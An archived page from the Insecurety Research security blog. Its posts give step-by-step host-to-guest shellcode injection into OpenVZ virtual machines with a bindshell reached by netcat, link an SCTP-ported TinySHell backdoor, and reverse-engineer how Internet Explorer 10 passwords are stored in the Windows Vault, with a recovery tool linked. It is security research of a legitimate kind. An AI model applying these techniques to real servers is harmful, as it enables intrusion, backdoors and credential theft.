http://insecurety.net/
HTTP/1.1 200 OK
Date: Tue, 22 Jul 2014 07:18:27 GMT
Server: Apache
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
X-Pingback: http://insecurety.net/wordpress/xmlrpc.php
X-Powered-By: PHP/5.2.17
Set-Cookie: PHPSESSID=cfa7o3acjc2nah0jvmhr3mspt3; path=/
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width" />
<title>Insecurety Research | We are spelling it wrong&#8230; You are DOING it wrong!</title>
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="stylesheet" type="text/css" media="all" href="http://insecurety.net/wordpress/wp-content/themes/twentyeleven/style.css" />
<link rel="pingback" href="http://insecurety.net/wordpress/xmlrpc.php" />
<!--[if lt IE 9]>
<script src="http://insecurety.net/wordpress/wp-content/themes/twentyeleven/js/html5.js" type="text/javascript"></script>
<![endif]-->
<script type="text/javascript">
	window.google_analytics_uacct = "UA-29160828-1";
</script>
<link rel="alternate" type="application/rss+xml" title="Insecurety Research &raquo; Feed" href="http://insecurety.net/?feed=rss2" />
<link rel="alternate" type="application/rss+xml" title="Insecurety Research &raquo; Comments Feed" href="http://insecurety.net/?feed=comments-rss2" />

            <script type="text/javascript">//<![CDATA[
            // Google Analytics for WordPress by Yoast v4.3.5 | http://yoast.com/wordpress/google-analytics/
            var _gaq = _gaq || [];
            _gaq.push(['_setAccount', 'UA-29160828-1']);
				            _gaq.push(['_trackPageview']);
            (function () {
                var ga = document.createElement('script');
                ga.type = 'text/javascript';
                ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';

                var s = document.getElementsByTagName('script')[0];
                s.parentNode.insertBefore(ga, s);
            })();
            //]]></script>
			<link rel='stylesheet' id='stf-adsense-css'  href='http://insecurety.net/wordpress/wp-content/plugins/adsense-widget/adsense-widget.css?ver=1.0' type='text/css' media='all' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://insecurety.net/wordpress/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://insecurety.net/wordpress/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 3.9.1" />
</head>

<body class="home blog two-column right-sidebar">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
			<hgroup>
				<h1 id="site-title"><span><a href="http://insecurety.net/" rel="home">Insecurety Research</a></span></h1>
				<h2 id="site-description">We are spelling it wrong&#8230; You are DOING it wrong!</h2>
			</hgroup>

						<a href="http://insecurety.net/">
									<img src="http://insecurety.net/wordpress/wp-content/uploads/2012/12/Untitled1.jpeg" width="1000" height="288" alt="" />
							</a>
			
								<form method="get" id="searchform" action="http://insecurety.net/">
		<label for="s" class="assistive-text">Search</label>
		<input type="text" class="field" name="s" id="s" placeholder="Search" />
		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search" />
	</form>
			
			<nav id="access" role="navigation">
				<h3 class="assistive-text">Main menu</h3>
								<div class="skip-link"><a class="assistive-text" href="#content">Skip to primary content</a></div>
									<div class="skip-link"><a class="assistive-text" href="#secondary">Skip to secondary content</a></div>
												<div class="menu"><ul><li class="current_page_item"><a href="http://insecurety.net/">Home</a></li><li class="page_item page-item-2"><a href="http://insecurety.net/?page_id=2">About/Contact</a></li><li class="page_item page-item-93"><a href="http://insecurety.net/?page_id=93">Services Available</a></li></ul></div>
			</nav><!-- #access -->
	</header><!-- #branding -->


	<div id="main">

		<div id="primary">
			<div id="content" role="main">

			
						<nav id="nav-above">
			<h3 class="assistive-text">Post navigation</h3>
			<div class="nav-previous"><a href="http://insecurety.net/?paged=2" ><span class="meta-nav">&larr;</span> Older posts</a></div>
			<div class="nav-next"></div>
		</nav><!-- #nav-above -->
	
								
					
	<article id="post-1017" class="post-1017 post type-post status-publish format-standard hentry category-exploit category-hack category-security tag-container tag-hacking tag-kvm tag-linux tag-openvz tag-parasite tag-privacy tag-process-injection tag-rogue-admins tag-security tag-solusvm tag-vmware">
		<header class="entry-header">
						<h1 class="entry-title"><a href="http://insecurety.net/?p=1017" rel="bookmark">Host to Guest Code Injection in OpenVZ</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="http://insecurety.net/?p=1017" title="4:53 pm" rel="bookmark"><time class="entry-date" datetime="2014-02-25T16:53:22+00:00">February 25, 2014</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="http://insecurety.net/?author=1" title="View all posts by infodox" rel="author">infodox</a></span></span>			</div><!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="http://insecurety.net/?p=1017#comments" title="Comment on Host to Guest Code Injection in OpenVZ">2</a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>This is a paper I wrote ages back, forgot about, decided to publish after OpenSSL got popped, forgot about *again* because my site was being a bollix and not working, and then remembered when walking home today. For the /r/netsec folk who will probably bash it as lame/not a new idea, yeah, its not new. Its not even that cool. But I still found it amusing as it helps show that &#8220;Virtual Private Servers&#8221; are not exactly anything that could be called private.</p>
<p><strong>Abstract/Brief:<br />
</strong>This paper documents a trivial method of injecting code with superuser privileges in guest virtual machines on OpenVZ systems. The conditions are that you have access to the host machine, with either a superuser account or one which has access to the OpenVZ virtual machines process space, for example, the SolusVM account on badly configured SolusVM setups. Such setups are rather common in the wild in both enterprise settings (private clouds) and VPS/web hosting companies. While not providing a remote-root exploit, it is an interesting method of abusing shared processes in virtualization software to own boxes.</p>
<p><strong>Introduction:</strong><br />
Recently I, the author, was granted access to an OpenVZ setup on a virtual server host by the owner, and permitted to use it for experimentation purposes with the view to iron out any bugs before the service was publicly launched. The setup was using SolusVM/WHMCS to “Manage” the VPS servers and customer service, on an x86_64 CentOS host. The virtualization software was the reasonably popular OpenVZ software.</p>
<p>Previously, the author had worked with a colleague on a Linux process-injection tool, beta testing it and locating bugs. It was realized, after reading the (terrible) OpenVZ documentation, and after an idiot administrator ran “killall apache2” on the main host, that in an OpenVZ setup the process space is shared, with the processes on guest operating systems being directly accessible from the host machine.</p>
<p>The natural line of investigation from this was “what will happen if we try inject code into the processes of virtual machines running on the host, from the host itself?”. This line of investigation lead to the following vulnerability being discovered, and exploitation was found to be incredibly reliable.</p>
<p><strong>General Overview of Exploitation:</strong><br />
From the host machine, all the guest systems processes run in a shared space, and may be directly manipulated from the host operating system. For example, running “killall apache2” on the host system will send the kill signal to any Apache2 processes running on the host systems (generally leading to pissed off customers). I believe this architecture is designed so a host can legitimately terminate processes on guest systems which are consuming more than their allocated amount of resources.</p>
<p>Seeing as the process space of guest systems is directly accessible to the host, standard techniques for process injection may be used to execute code on any or all of the guest operating systems. Therefore, it is considered trivial to inject code into guest operating systems from the virtual machine host while using the OpenVZ virtualization solution.</p>
<p><strong>Impact of Exploitation:</strong><br />
While some may think that “if the host is rooted, the guests are compromised anyway”, and simply ignore the content of this paper, there are several rather interesting ramifications to this technique. They are not wrong either.</p>
<p>Of primary interest, it demonstrates that there can be no real expectation of privacy for users of “Virtual Private Servers”, which include many web hosting firms and enterprises.</p>
<p>It also demonstrates the lack of protection of guest processes from the host in the OpenVZ stack, which means the guests not only have to worry about the security of their own server, but are completely at risk if the host machine is compromised. Finally, it was a really neat trick, and allowed for some interesting things to be done.</p>
<p><strong>Practical Exploitation:</strong><br />
For this demonstration, we used the process-injection tool developed by “jtRIPper”, “parasite”. You may download it from: https://github.com/jtRIPper/parasite</p>
<p>The host machine was running CentOS, OpenVZ and SolusVM (management software for OpenVZ). The guest host used in this demonstration, “bastion”, was running Debian. All architectures are x86_64. The utilities used on the hosting server were the “vzlist” utility, grep, and the “ps” tool, for location of process ID&#8217;s to inject into.</p>
<p><strong>Exploitation, step by step:</strong><br />
Step one: use “vzlist” to find the CTID of the target virtual machine. The CTID is the number, normally a three digit number, listed in the first column. In the screencap, I told it to only output the details of my target virtual machine using grep. It also will give you the IP address of the target machine, take note of this as we will use it to connect to the bind-shell later.</p>
<p>Step two: Once you have the CTID of your target virtual machine, simply running “ps aux | grep $(CTID)” (put your CTID in there&#8230;) will list running processes on the target virtual machine. It will also output some unrelated processes, but the owner of the processes will be the same as the CTID, making locating them easy. A cleaner way is to grep for “root/$(CTID)” which I did in the demo to make it cleaner output.</p>
<p>Step Three: Process ID in hand, we use the parasite utility to inject our shellcode into the process. The payload is a bindshell on port 4444. Simply do “./parasite $(PID)” to inject code.</p>
<p>Step Four: Use netcat to connect to the bindshell on port 4444 of the target host. You should have the privileges of the process you injected into.</p>
<p>Step Five: Well, thats the box rooted, so, er, have fun and play safe?</p>
<p><a href="http://insecurety.net/wordpress/wp-content/uploads/2014/02/injectandown.png" ><img class="aligncenter size-large wp-image-1021" alt="injectandown" src="http://insecurety.net/wordpress/wp-content/uploads/2014/02/injectandown-1024x575.png" width="584" height="327" /></a></p>
<p>&nbsp;</p>
<p><strong>Analysis:</strong><br />
This technique can be used to gain access to virtual machines from<br />
the host machine. This impacts the integrity and privacy of the data<br />
on the virtual machine.</p>
<p>It also provides an interesting lesson in how Linux process injection<br />
techniques can be used to do more interesting things than simply<br />
backdooring the SSHd on the host.</p>
<p>This proves conclusively that under OpenVZ, the guest virtual<br />
machines are completely vulnerable to the host VM. This has<br />
definate ramifications for the supposed privacy of “Virtual Private<br />
Servers” on an OpenVZ stack, as it means the percieved privacy<br />
may be completely subverted by a rogue administrator.</p>
<p><strong>Conclusion:</strong><br />
There is a lack of seperation of processes in the OpenVZ<br />
hypervisior, which can be abused by someone with access to the<br />
host machine to execute code inside the guest virtual machines.<br />
This can allow the host to subvert any security restrictions or similar<br />
on running guest machines, allowing theft of potentially confidential<br />
data from clients on the guest VM&#8217;s.</p>
<p>If you are using a VPS server which is on an OpenVZ stack, you<br />
therefore have no expectation of privacy whatsoever from the host<br />
machine.</p>
<p>Other hypervisiors have been shown to be similarly exploitable in<br />
the past, for example VMware. Further research into XEN and<br />
Virtualbox/KVM hypervisiors shall be needed to see if those also can<br />
be exploited (they can <img src="http://insecurety.net/wordpress/wp-includes/images/smilies/icon_wink.gif" alt=";)" class="wp-smiley" />  ).</p>
<p><strong>Code and further information/ideas:</strong><br />
https://github.com/jtRIPper/parasite – Process injection tool used in<br />
demo.<br />
http://cymothoa.sourceforge.net – Potentially useful Process<br />
Injection tool.<br />
https://github.com/batistam/VMInjector – VMware Host to Guest<br />
Code Injection PoC for Windows.<br />
http://openvz.org/Processes_scope_and_visibility – Information on<br />
processes in the OpenVZ hypervisior and ideas on making a better<br />
process-finding tool.</p>
<p><strong>Addentum:</strong><br />
OpenVZ also allows filesystem access from the host, no protection<br />
whatsoever against a malicious superuser on the host<br />
reading/altering your files. Apparently, a superuser on host can also<br />
spawn processes and suchlike, but the OpenVZ documentation was<br />
so rubbish, and I did not have the patience to find out/verify.</p>
<p>A guest-host jailbreak is doable on OpenVZ via kernel exploits, as<br />
seen with Enlightenment breaking out of OpenVZ containers, which<br />
are just a glorified chroot. As I no longer have access to<br />
infrastructure on which to run further testing (as of Feb. 2014), I<br />
cannot do further research until further notice. Unless, of course,<br />
someone wishes to just give me a dedicated server and a bunch of<br />
IP addresses to do with as I please <img src="http://insecurety.net/wordpress/wp-includes/images/smilies/icon_wink.gif" alt=";)" class="wp-smiley" /> </p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
												<span class="cat-links">
				<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://insecurety.net/?cat=44" title="View all posts in Exploit" rel="category">Exploit</a>, <a href="http://insecurety.net/?cat=7" title="View all posts in Hack" rel="category">Hack</a>, <a href="http://insecurety.net/?cat=11" title="View all posts in Security" rel="category">Security</a>			</span>
															<span class="sep"> | </span>
							<span class="tag-links">
				<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="http://insecurety.net/?tag=container" rel="tag">Container</a>, <a href="http://insecurety.net/?tag=hacking" rel="tag">Hacking</a>, <a href="http://insecurety.net/?tag=kvm" rel="tag">KVM</a>, <a href="http://insecurety.net/?tag=linux" rel="tag">Linux</a>, <a href="http://insecurety.net/?tag=openvz" rel="tag">OpenVZ</a>, <a href="http://insecurety.net/?tag=parasite" rel="tag">Parasite</a>, <a href="http://insecurety.net/?tag=privacy" rel="tag">privacy</a>, <a href="http://insecurety.net/?tag=process-injection" rel="tag">Process Injection</a>, <a href="http://insecurety.net/?tag=rogue-admins" rel="tag">Rogue Admins</a>, <a href="http://insecurety.net/?tag=security" rel="tag">Security</a>, <a href="http://insecurety.net/?tag=solusvm" rel="tag">SolusVM</a>, <a href="http://insecurety.net/?tag=vmware" rel="tag">Vmware</a>			</span>
						
									<span class="sep"> | </span>
						<span class="comments-link"><a href="http://insecurety.net/?p=1017#comments" title="Comment on Host to Guest Code Injection in OpenVZ"><b>2</b> Replies</a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-1017 -->

				
					
	<article id="post-991" class="post-991 post type-post status-publish format-standard hentry category-hack category-malware category-networking category-packet-fu category-tcpip tag-backdoor tag-hacking tag-linux tag-malware tag-reverse-shell tag-sctp tag-security tag-shell tag-tcp tag-unix">
		<header class="entry-header">
						<h1 class="entry-title"><a href="http://insecurety.net/?p=991" rel="bookmark">TinySHell &#8211; Ported to SCTP</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="http://insecurety.net/?p=991" title="10:32 pm" rel="bookmark"><time class="entry-date" datetime="2013-10-19T22:32:00+00:00">October 19, 2013</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="http://insecurety.net/?author=1" title="View all posts by infodox" rel="author">infodox</a></span></span>			</div><!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="http://insecurety.net/?p=991#comments" title="Comment on TinySHell &#8211; Ported to SCTP">1</a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>You may have seen, a while ago, my post on SCTP reverse shells.</p>
<p>I realized quite quickly that I should definately do some more research in this direction, and hence ported one of my favourite Unix backdoors (which uses a TCP connection) to use a SCTP connection instead. This backdoor allows for a remote PTY, file upload, and file download. It also is encrypted connection.</p>
<p>The backdoor in question is &#8216;TinySHell&#8217; by the inestimable Christophe Devine (who left quite a legacy of code, which I may start to maintain as he appears to have vanished. Chris, if you are out there, get in touch or something! Love your work!). I spent a short while examining the code, then quickly patched it up to replace all the TCP stuff with SCTP stuff. I imagine I could easily alter it to do UDP, and might try that later.</p>
<p>Anyways, without further ado, here is the code. Again, all credit to Chris, all I did was modify it!</p>
<p><a href="https://github.com/infodox/tsh-sctp" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://github.com']);">https://github.com/infodox/tsh-sctp</a></p>
<p>Aaaand a video of it in-use (rough cut, no editing, some freezing. Will clean up later)</p>
<p><iframe src="//www.youtube.com/embed/yVvD8f3I5hY" height="315" width="420" allowfullscreen="" frameborder="0"></iframe><br />
Also, we have not died here. Some, er, circumstances lead to extended hiatus in publication of research material.</p>
<p>Happy pwning!</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
												<span class="cat-links">
				<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://insecurety.net/?cat=7" title="View all posts in Hack" rel="category">Hack</a>, <a href="http://insecurety.net/?cat=99" title="View all posts in malware" rel="category">malware</a>, <a href="http://insecurety.net/?cat=24" title="View all posts in Networking" rel="category">Networking</a>, <a href="http://insecurety.net/?cat=23" title="View all posts in Packet-Fu" rel="category">Packet-Fu</a>, <a href="http://insecurety.net/?cat=22" title="View all posts in TCP/IP" rel="category">TCP/IP</a>			</span>
															<span class="sep"> | </span>
							<span class="tag-links">
				<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="http://insecurety.net/?tag=backdoor" rel="tag">backdoor</a>, <a href="http://insecurety.net/?tag=hacking" rel="tag">Hacking</a>, <a href="http://insecurety.net/?tag=linux" rel="tag">Linux</a>, <a href="http://insecurety.net/?tag=malware" rel="tag">malware</a>, <a href="http://insecurety.net/?tag=reverse-shell" rel="tag">reverse shell</a>, <a href="http://insecurety.net/?tag=sctp" rel="tag">SCTP</a>, <a href="http://insecurety.net/?tag=security" rel="tag">Security</a>, <a href="http://insecurety.net/?tag=shell" rel="tag">shell</a>, <a href="http://insecurety.net/?tag=tcp" rel="tag">tcp</a>, <a href="http://insecurety.net/?tag=unix" rel="tag">unix</a>			</span>
						
									<span class="sep"> | </span>
						<span class="comments-link"><a href="http://insecurety.net/?p=991#comments" title="Comment on TinySHell &#8211; Ported to SCTP"><b>1</b> Reply</a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-991 -->

				
					
	<article id="post-933" class="post-933 post type-post status-publish format-standard hentry category-algorithms category-passwords category-reverse-engineering category-security tag-credential-manager tag-dpapi tag-ie10 tag-internet-explorer tag-passwords-2 tag-vault tag-windows">
		<header class="entry-header">
						<h1 class="entry-title"><a href="http://insecurety.net/?p=933" rel="bookmark">Password Algorithms: Internet Explorer 10 (Windows Vault)</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="http://insecurety.net/?p=933" title="1:27 am" rel="bookmark"><time class="entry-date" datetime="2013-07-27T01:27:53+00:00">July 27, 2013</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="http://insecurety.net/?author=3" title="View all posts by dietrich" rel="author">dietrich</a></span></span>			</div><!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="http://insecurety.net/?p=933#comments" title="Comment on Password Algorithms: Internet Explorer 10 (Windows Vault)">1</a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<h2>Introduction</h2>
<p>Microsoft added a new feature to Windows 7 called &#8216;Vault&#8217; which you can access through the Credential Manager in control panel or vaultcmd from command line. It works very similar to Gnome Key Ring on Linux or the Apple Keychain on Mac OS.</p>
<p>In versions 7, 8 and 9 of Internet Explorer, passwords were protected using DPAPI and the login URL as entropy before being saved in the registry. The new algorithm in IE10 continues to use DPAPI but the encryption of credentials is now handled by the Vault Service.</p>
<h2>Vault System Service</h2>
<p>Like most Windows Encryption, the protection of Vault data occurs within a LocalSystem service. <strong>vaultsvc.dll</strong> contains the service code and is loaded by the <em>Local Security Account Subsystem (lsass.exe)</em> at boot time.</p>
<p>Between 18-24 functions (depending on OS) are exposed to clients over a local RPC end point. On Windows 7 is an additional <strong>KeyRing Credential UI application (VaultSysUI.exe)</strong> launched by the service if it requires information from the owner of a vault.</p>
<p>For example, you have the ability to lock a vault with a password.<br /><a href="http://insecurety.net/wordpress/wp-content/uploads/2013/07/windows_7_lock.png" ><img src="http://insecurety.net/wordpress/wp-content/uploads/2013/07/windows_7_lock.png" alt="windows_7_lock" width="439" height="262" class="alignnone size-full wp-image-940" /></a><br />
You can also configure a vault to require permission from the user when an application attempts to access the password element.<br />
<a href="http://insecurety.net/wordpress/wp-content/uploads/2013/07/windows_7_prompt.png" ><img src="http://insecurety.net/wordpress/wp-content/uploads/2013/07/windows_7_prompt.png" alt="windows_7_prompt" width="444" height="298" class="alignnone size-full wp-image-941" /></a><br />
In both situations, VaultSysUI will display a window to the user and then write the response back to heap memory which Vault Service can access. <img src="http://insecurety.net/wordpress/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
<p>Although both these features are useful and add further protection to a user&#8217;s credentials, they were removed in Windows 8 along with other functionality.</p>
<h2>Vault Client Library Access</h2>
<p>From the user session, RPC calls are made through API exported by <strong>vaultcli.dll</strong><br />
<strong>Explorer.exe</strong> loads <strong>Credui.dll</strong> and <strong>Vault.dll</strong> when accessing the Credential Manager through the Control Panel.<br />
<a href="http://insecurety.net/wordpress/wp-content/uploads/2013/07/credman.png" ><img src="http://insecurety.net/wordpress/wp-content/uploads/2013/07/credman.png" alt="credman" width="650" height="378" class="alignnone size-full wp-image-942" /></a><br />
You can also use <strong>vaultcmd.exe</strong> to add/remove credentials but it doesn&#8217;t display passwords on either 7 or 8.<br />
<a href="http://insecurety.net/wordpress/wp-content/uploads/2013/07/vaultcmd7.png" ><img src="http://insecurety.net/wordpress/wp-content/uploads/2013/07/vaultcmd7.png" alt="vaultcmd7" width="677" height="311" class="alignnone size-full wp-image-937" /></a><br />
On Windows 8 . . .<br />
<a href="http://insecurety.net/wordpress/wp-content/uploads/2013/07/vaultcmd8.png" ><img src="http://insecurety.net/wordpress/wp-content/uploads/2013/07/vaultcmd8.png" alt="vaultcmd8" width="678" height="316" class="alignnone size-full wp-image-938" /></a><br />
For whatever reasons, there was a pretty significant reduction in Vault features between Windows 7 and 8. Below is a list of what was removed.
<ul>
<li>Creation / Deletion of vaults.</li>
<li>Loading / Unloading external vault files.</li>
<li>Locking / Unlocking vaults with additional password protection.</li>
</ul>
<h2>Protection Methods</h2>
<p>Windows 7 has 2 methods available but Windows 8 only has 1.<br />
DPAPI (Data Protection API) is used by default but on Windows 7, you can also use a password.<br /> <br />
The algorithm used to protect passwords is RSA PBKDF2.</p>
<h2>Recovery of Web Credentials</h2>
<p>As said, there were some changes to Vault service between Windows 7 and 8.<br />
<strong>VaultGetItem</strong> requires an additional parameter on Windows 8 and the <strong>VAULT_ITEM</strong> structure has an extra property. Here&#8217;s the structure for Windows 7</p>
<pre style="font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace;color: #000000;background-color: #eee;font-size: 12px;border: 1px dashed #999999;line-height: 14px;padding: 5px;overflow: auto;width: 100%"><code>typedef struct _VAULT_ITEM_W7 {
  GUID SchemaId;
  LPCWSTR pszCredentialFriendlyName;
  PVAULT_ITEM_ELEMENT pResourceElement;
  PVAULT_ITEM_ELEMENT pIdentityElement;
  PVAULT_ITEM_ELEMENT pAuthenticatorElement;
  FILETIME LastModified;
  DWORD dwFlags;
  DWORD dwPropertiesCount;
  PVAULT_ITEM_ELEMENT pPropertyElements;
} VAULT_ITEM_W7, *PVAULT_ITEM_W7;
</code></pre>
<p>And for Windows 8 . . .</p>
<pre style="font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace;color: #000000;background-color: #eee;font-size: 12px;border: 1px dashed #999999;line-height: 14px;padding: 5px;overflow: auto;width: 100%"><code>typedef struct _VAULT_ITEM_W8 {
  GUID SchemaId;
  LPCWSTR pszCredentialFriendlyName;
  PVAULT_ITEM_ELEMENT pResourceElement;
  PVAULT_ITEM_ELEMENT pIdentityElement;
  PVAULT_ITEM_ELEMENT pAuthenticatorElement;
  PVAULT_ITEM_ELEMENT pPackageSid;
  FILETIME LastModified;
  DWORD dwFlags;
  DWORD dwPropertiesCount;
  PVAULT_ITEM_ELEMENT pPropertyElements;
} VAULT_ITEM_W8, *PVAULT_ITEM_W8;
</code></pre>
<p>I&#8217;ve written a tool to recover IE10 passwords using the Vault API, here&#8217;s example of output on Windows 7 machine.<br />
<a href="http://insecurety.net/wordpress/wp-content/uploads/2013/07/ie10_decode.png" ><img src="http://insecurety.net/wordpress/wp-content/uploads/2013/07/ie10_decode.png" alt="ie10_decode" width="677" height="263" class="alignnone size-full wp-image-939" /></a><br />
For those of you that want to know more about recovery process, you can <a href="http://insecurety.net/downloads/pwdtools/ie10_decode.zip" onclick="javascript:_gaq.push(['_trackEvent','download','http://insecurety.net/downloads/pwdtools/ie10_decode.zip']);">grab source and binary here.</a><br />
Because the Windows Vault Service remains undocumented, I can&#8217;t guarantee the accuracy of information provided. The latest protection of Web Credentials for Internet Explorer is indeed weaker than previous algorithm for 7, 8 and 9 but the upside is that with the Vault you can reliably backup/restore your passwords when needed.</p>
<p>Below is just a list of API available/removed between Windows 7 and 8.</p>
<table border="1" cellpadding="3">
<tr>
<td>Credential Vault Client Library Function</td>
<td>Windows 7</td>
<td>Windows 8</td>
</tr>
<tr>
<td>VaultCreateItemType</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultDeleteItemType</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultEnumerateItemTypes</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultAddItem</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultFindItems</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultEnumerateItems</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultGetItem</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultRemoveItem</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultGetItemType</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultOpenVault</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultCloseVault</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultGetInformation</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultEnumerateVaults</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultSetInformation</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultCreateVault</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultCopyVault</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultDeleteVault</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultLoadVaults</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultUnloadVaults</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultCopyItem</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultMoveItem</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultLockVault</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultUnlockVault</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultConfirmVaultAccess</td>
<td bgcolor="00FF00">Yes</td>
<td bgcolor="FF3300">No</td>
</tr>
<tr>
<td>VaultEnumerateSettingUnits</td>
<td bgcolor="FF3300">No</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultGetSettingUnit</td>
<td bgcolor="FF3300">No</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultApplySettingUnit</td>
<td bgcolor="FF3300">No</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultRemoveSettingUnit</td>
<td bgcolor="FF3300">No</td>
<td bgcolor="00FF00">Yes</td>
</tr>
<tr>
<td>VaultTriggerSync</td>
<td bgcolor="FF3300">No</td>
<td bgcolor="00FF00">Yes</td>
</tr>
</table>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
												<span class="cat-links">
				<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://insecurety.net/?cat=214" title="View all posts in Algorithms" rel="category">Algorithms</a>, <a href="http://insecurety.net/?cat=213" title="View all posts in Passwords" rel="category">Passwords</a>, <a href="http://insecurety.net/?cat=38" title="View all posts in Reverse Engineering" rel="category">Reverse Engineering</a>, <a href="http://insecurety.net/?cat=11" title="View all posts in Security" rel="category">Security</a>			</span>
															<span class="sep"> | </span>
							<span class="tag-links">
				<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="http://insecurety.net/?tag=credential-manager" rel="tag">credential manager</a>, <a href="http://insecurety.net/?tag=dpapi" rel="tag">DPAPI</a>, <a href="http://insecurety.net/?tag=ie10" rel="tag">ie10</a>, <a href="http://insecurety.net/?tag=internet-explorer" rel="tag">Internet Explorer</a>, <a href="http://insecurety.net/?tag=passwords-2" rel="tag">passwords</a>, <a href="http://insecurety.net/?tag=vault" rel="tag">vault</a>, <a href="http://insecurety.net/?tag=windows" rel="tag">Windows</a>			</span>
						
									<span class="sep"> | </span>
						<span class="comments-link"><a href="http://insecurety.net/?p=933#comments" title="Comment on Password Algorithms: Internet Explorer 10 (Windows Vault)"><b>1</b> Reply</a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-933 -->

				
					
	<article id="post-765" class="post-765 post type-post status-publish format-standard hentry category-hack category-malware category-networking category-packet-fu category-python category-security tag-egress-busting tag-exfiltration tag-firewall-evasion tag-ids-evasion tag-ncat tag-networking-2 tag-penetration-testing tag-python-2 tag-reverse-shells tag-sctp">
		<header class="entry-header">
						<h1 class="entry-title"><a href="http://insecurety.net/?p=765" rel="bookmark">SCTP Reverse Shell</a></h1>
			
